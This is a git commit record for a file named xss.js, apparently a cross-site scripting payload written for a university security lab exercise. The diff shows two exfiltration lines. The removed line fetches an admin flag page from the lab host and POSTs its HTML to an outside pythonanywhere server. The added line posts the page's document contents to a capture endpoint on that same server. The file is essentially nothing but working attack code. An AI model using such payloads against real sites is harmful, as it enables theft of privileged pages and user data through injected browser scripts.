d8551e85c80fd87f12321df123b82ff125cb388d
qqqvaqushka <108834751+qqqvaqushka@users.noreply.github.com>
2024-10-11 16:03:48 +0300

    xss.js

--- xss.js
+++ xss.js
@@ -1,2 +1,2 @@
 alert("!")
-fetch("http://corporate.tasks.prak.seclab.cs.msu.ru/admin/flag").then(function(resp){return (resp.text())}).then(function(html){ fetch("https://dalexey.pythonanywhere.com/",{ method: "POST", body : html }) })
+fetch("https://dalexey.pythonanywhere.com/capture",{ method: "POST", body : "data="+document.all })
